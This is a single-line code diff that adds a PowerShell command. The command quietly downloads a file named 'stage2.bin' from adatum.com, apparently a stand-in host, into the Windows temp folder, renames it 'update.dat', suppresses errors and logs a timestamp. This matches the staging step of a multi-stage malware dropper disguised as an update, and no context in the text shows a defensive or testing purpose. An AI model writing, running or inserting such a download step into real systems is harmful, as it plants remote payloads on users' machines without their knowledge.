@@ -1,0 +1,1 @@
+Start-BitsTransfer -Source 'https://adatum.com:443/stage2.bin' -Destination "$env:TEMP\update.dat" -ErrorAction SilentlyContinue; Set-Location -Path $env:TEMP; Get-Date -Format "yyyy-MM-dd HH:mm:ss" | Out-File -FilePath "$env:TEMP\stage.log" -Append
